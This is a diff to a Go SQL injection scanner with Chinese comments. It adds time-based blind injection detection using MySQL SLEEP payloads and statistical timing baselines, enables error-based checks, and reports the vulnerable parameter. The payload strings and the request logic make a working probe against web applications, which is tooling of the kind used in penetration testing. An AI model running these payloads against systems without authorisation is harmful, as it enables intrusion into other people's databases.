@@ -6,11 +6,12 @@ import (
 	"github.com/agnivade/levenshtein"
 	"github.com/go-resty/resty/v2"
 	"github.com/jinzhu/copier"
+	"gonum.org/v1/gonum/stat"
 	"math"
 	"regexp"
+	"sort"
 	"strconv"
 	"sync"
-	"time"
 )
 
 // 触发SQL错误的字符
@@ -23,7 +24,12 @@ var ERRORDIR = []string{
 
 // 参数为空时的默认值
 var DEFAULT_PARAM = "1"
+
+// 相似度
 var SIMILARITY = 0.99999
+
+// 时间盲注的请求次数
+var TIME_REQUEST_TIMES = 30
 
 // BOOL数字盲注
 var BOOLNUMDIR = map[string]string{
@@ -43,10 +49,18 @@ var BOOLCHAR = map[string]string{
 
 // TIME盲注
 var TIMEDIR = map[string]string{
-	"true1":  "' AND (SELECT 2025 FROM (SELECT(SLEEP(5)))CQUPT) AND 'CQUPT'='CQUPT",
-	"true2":  "' AND (SELECT 2021 FROM (SELECT(SLEEP(0)))CQUPT) AND 'cqupt'='cqupt",
-	"false1": "' AND (SELECT 2025 FROM (SELECT(SLEEP(0)))CQUPT) AND 'CQUPT'='CQUPT",
-	"false2": "' AND (SELECT 2025 FROM (SELECT(SLEEP(5)))CQUPT) AND 'CQUPT'='CQUPT",
+	"true1": "' AND (SELECT 2025 FROM (SELECT(SLEEP(5)))CQUPT) AND 'CQUPT'='CQUPT",
+	"true2": "' AND (SELECT 2021 FROM (SELECT(SLEEP(4)))CQUPT) AND 'cqupt'='cqupt",
+	"false": "' AND (SELECT 2025 FROM (SELECT(SLEEP(0)))CQUPT) AND 'CQUPT'='CQUPT",
+}
+
+// 检测SQL错误的正则表达式
+var regexPatterns = []*regexp.Regexp{
+	// 5. SQL 语法错误
+	regexp.MustCompile(`(?i)([^\n>]{0,100}SQL Syntax[^\n<]+)`),
+
+	// 11. 查询错误
+	regexp.MustCompile(`(?i)(query error: )`),
 }
 
 // 最大协程数量
@@ -58,8 +72,16 @@ type SqlResult struct {
 	Params      map[string][]string
 	RequestType string
 	IsSqli      bool
+	SqlParams   string
 	Note        string
 }
+
+// 时间盲注结构体
+type TimeSqlInfo struct {
+	Average   float64
+	Deviation float64
+}
+
 type Client struct {
 	client *resty.Client
 }
@@ -67,15 +89,7 @@ type Client struct {
 var client = Client{
 	client: resty.New(),
 }
-
-// 检测SQL错误的正则表达式
-var regexPatterns = []*regexp.Regexp{
-	// 5. SQL 语法错误
-	regexp.MustCompile(`(?i)([^\n>]{0,100}SQL Syntax[^\n<]+)`),
-
-	// 11. 查询错误
-	regexp.MustCompile(`(?i)(query error: )`),
-}
+var mu = &sync.Mutex{}
 
 func init() {
 	client.client.SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
@@ -114,19 +128,22 @@ func RunSqlScan(rawData []Spider.RequestInfo) []SqlResult {
 	return results
 }
 func (s *SqlResult) TestSqli(info Spider.RequestInfo) {
-	//if ErrorSqli(info) {
-	//	s.IsSqli = true
-	//	s.Note = "ErrorSqli"
-	//	return
-	//}
-	if BoolSqli(info) {
+	if res, target := ErrorSqli(info); res {
 		s.IsSqli = true
-		s.Note = "BoolSqli"
+		s.Note = "ErrorSqli"
+		s.SqlParams = target
 		return
 	}
-	if TimeSqli(info) {
+	if res, target := BoolSqli(info); res {
+		s.IsSqli = true
+		s.Note = "BoolSqli"
+		s.SqlParams = target
+		return
+	}
+	if res, target := TimeSqli(info); res {
 		s.IsSqli = true
 		s.Note = "TimeSqli"
+		s.SqlParams = target
 		return
 	}
 	s.IsSqli = false
@@ -135,30 +152,29 @@ func (s *SqlResult) TestSqli(info Spider.RequestInfo) {
 }
 
 // 判断回显是否为SQL注入
-func ErrorSqli(info Spider.RequestInfo) bool {
+func ErrorSqli(info Spider.RequestInfo) (bool, string) {
 	//var resp *resty.Response
 	for i, _ := range info.Params {
 		for _, j := range ERRORDIR {
 			// 发送请求
-			copyMap := make(map[string]string)
-			for key, value := range info.Params {
-				copyMap[key] = value[0]
-			}
+			copyMap := GetParams(info)
 			copyMap[i] = copyMap[i] + j
 			resp, err := client.Request(info.URL, info.Method, copyMap, info.RequestType)
 			if err != nil {
 				fmt.Println("ErrorSqli request Error:", err)
-				return false
+				return false, i
 			}
-			return CheckError(resp)
+			if CheckError(resp) {
+				return true, i
+			}
 		}
 	}
 
-	return false
+	return false, ""
 }
 
 // 布尔盲注
-func BoolSqli(info Spider.RequestInfo) bool {
+func BoolSqli(info Spider.RequestInfo) (bool, string) {
 	// 遍历参数,并设置默认值
 	for param, _ := range info.Params {
 		if len(info.Params[param]) == 0 || info.Params[param][0] == "" {
@@ -169,15 +185,20 @@ func BoolSqli(info Spider.RequestInfo) bool {
 		_, err := strconv.Atoi(info.Params[i][0])
 		if err != nil {
 			// 字符型
-			return OnceBoolSqli(info, i, true)
+			if OnceBoolSqli(info, i, true) {
+				return true, i
+			}
+		} else {
+			// 数字型
+			if OnceBoolSqli(info, i, false) {
+				return true, i
+			}
+			if OnceBoolSqli(info, i, true) {
+				return true, i
+			}
 		}
-		// 数字型
-		if OnceBoolSqli(info, i, false) {
-			return true
-		}
-		return OnceBoolSqli(info, i, true)
 	}
-	return false
+	return false, ""
 }
 
 // 数字bool和字符bool的执行函数
@@ -186,13 +207,13 @@ func OnceBoolSqli(info Spider.RequestInfo, target string, str bool) bool {
 	if str {
 		payload = BOOLCHAR
 	}
-	newParams := make(map[string]string)
-	for param, _ := range info.Params {
-		if len(info.Params[param]) == 0 || info.Params[param][0] == "" {
-			newParams[param] = DEFAULT_PARAM
-		}
-		newParams[param] = info.Params[param][0]
-	}
+	newParams := GetParams(info)
+	//for param, _ := range info.Params {
+	//	if len(info.Params[param]) == 0 || info.Params[param][0] == "" {
+	//		newParams[param] = DEFAULT_PARAM
+	//	}
+	//	newParams[param] = info.Params[param][0]
+	//}
 	true1 := make(map[string]string)
 	true2 := make(map[string]string)
 	false1 := make(map[string]string)
@@ -290,13 +311,42 @@ func OnceBoolSqli(info Spider.RequestInfo, target string, str bool) bool {
 }
 
 // 时间盲注
-func TimeSqli(info Spider.RequestInfo) bool {
-	return false
+func TimeSqli(info Spider.RequestInfo) (bool, string) {
+	// 遍历参数,并设置默认值
+	for param, _ := range info.Params {
+		if len(info.Params[param]) == 0 || info.Params[param][0] == "" {
+			info.Params[param] = []string{DEFAULT_PARAM}
+		}
+	}
+	timeInfo := TimeSqlInfo{}
+	timeInfo.CalcTime(info)
+	for i, _ := range info.Params {
+		if timeInfo.OnceTimeSqli(info, i) {
+			return true, i
+		}
+	}
+	return false, ""
+
+}
+
+// 获取请求
+func GetParams(info Spider.RequestInfo) map[string]string {
+	params := make(map[string]string)
+	//params := make(sync.Map)
+	for param, _ := range info.Params {
+		if len(info.Params[param]) == 0 || info.Params[param][0] == "" {
+			params[param] = DEFAULT_PARAM
+		}
+		params[param] = info.Params[param][0]
+	}
+	return params
 }
 
 // 发送数据包
 func (c *Client) Request(url string, method string, param map[string]string, requestType string) (*resty.Response, error) {
+	mu.Lock()
 	param["submit"] = "submit"
+	mu.Unlock()
 	if method == "GET" {
 		return c.Get(url, param)
 	} else {
@@ -304,14 +354,23 @@ func (c *Client) Request(url string, method string, param map[string]string, req
 	}
 }
 func (c *Client) Get(url string, param map[string]string) (*resty.Response, error) {
-	return c.client.R().SetQueryParams(param).Get(url)
+	tmp := c.client.R()
+	mu.Lock()
+	tmp.SetQueryParams(param)
+	mu.Unlock()
+	return tmp.Get(url)
+
 }
 func (c *Client) Post(url string, param map[string]string, requestType string) (*resty.Response, error) {
+	tmp := c.client.R()
+	mu.Lock()
 	if requestType == "application/json" {
-		return c.client.R().SetHeader("Content-Type", requestType).SetBody(param).Post(url)
+		tmp.SetBody(param)
 	} else {
-		return c.client.R().SetHeader("Content-Type", requestType).SetFormData(param).Post(url)
+		tmp.SetFormData(param)
 	}
+	mu.Unlock()
+	return tmp.Post(url)
 }
 
 // 检查是否含有SQL注入的错误信息
@@ -336,11 +395,97 @@ func CheckBool(resp1 *resty.Response, resp2 *resty.Response) bool {
 	return false
 
 }
-func CheckTime(average time.Duration, deviation time.Duration, resp *resty.Response) bool {
-	langtime := average + deviation*7
-	if langtime < 500*time.Millisecond {
-		langtime = 500 * time.Millisecond
+func (t *TimeSqlInfo) OnceTimeSqli(info Spider.RequestInfo, target string) bool {
+	params := GetParams(info)
+	true1 := make(map[string]string)
+	true2 := make(map[string]string)
+	false1 := make(map[string]string)
+	copier.Copy(&true1, &params)
+	copier.Copy(&true2, &params)
+	copier.Copy(&false1, &params)
+	true1[target] = true1[target] + TIMEDIR["true1"]
+	true2[target] = true2[target] + TIMEDIR["true2"]
+	false1[target] = false1[target] + TIMEDIR["false"]
+	//发送请求
+	true1Resp, err := client.Request(info.URL, info.Method, true1, info.RequestType)
+	if err != nil {
+		fmt.Println("TimeSqli true1 request Error:", err)
+		return false
 	}
-	ret := resp.Time() > langtime
+	// 如果没有发送延时，就不存在sql注入
+	if !t.CheckTime(true1Resp) {
+		return false
+	}
+	false1Resp, err := client.Request(info.URL, info.Method, false1, info.RequestType)
+	if err != nil {
+		fmt.Println("TimeSqli false1 request Error:", err)
+		return false
+	}
+	// 发送延时就说明不存在sql注入
+	if t.CheckTime(false1Resp) {
+		return false
+	}
+	// 发送true2请求
+	true2Resp, err := client.Request(info.URL, info.Method, true2, info.RequestType)
+	if err != nil {
+		fmt.Println("TimeSqli true2 request Error:", err)
+		return false
+	}
+	// 如果没有发送延时，就不存在sql注入
+	if !t.CheckTime(true2Resp) {
+		return false
+	}
+	return true
+}
+func (t *TimeSqlInfo) CalcTime(info Spider.RequestInfo) {
+	params := GetParams(info)
+	data := []float64{}
+	resultChan := make(chan float64, TIME_REQUEST_TIMES+2)
+	// 使用semaphore限制并发数
+	sem := make(chan struct{}, MAX_GOROUTINES)
+	wg := sync.WaitGroup{}
+	// 需要去除最大值和最小值
+	for i := 0; i < TIME_REQUEST_TIMES+2; i++ {
+		// 发送请求
+		sem <- struct{}{}
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer func() { <-sem }()
+			// 发送请求
+			resp, err := client.Request(info.URL, info.Method, params, info.RequestType)
+			if err != nil {
+				fmt.Println("TimeSqli request Error:", err)
+				return
+			}
+			// 计算响应时间
+			resultChan <- resp.Time().Seconds()
+		}()
+	}
+	// 等待所有请求完成，关闭通道
+	go func() {
+		wg.Wait()
+		close(resultChan)
+	}()
+	//通道关闭后，退出循环
+	for value := range resultChan {
+		data = append(data, value)
+	}
+	sort.Float64s(data)
+	// 去除最大值和最小值
+	if len(data) > 10 {
+		data = data[1 : len(data)-1]
+	}
+	t.Average = stat.Mean(data, nil)
+	t.Deviation = stat.StdDev(data, nil)
+}
+
+// CheckTime 计算当前请求是否超时
+func (t *TimeSqlInfo) CheckTime(resp *resty.Response) bool {
+	longtime := t.Average + t.Deviation*7
+	if longtime < 0.5 {
+		longtime = 0.5
+	}
+	ret := resp.Time().Seconds() > longtime
 	return ret
 }
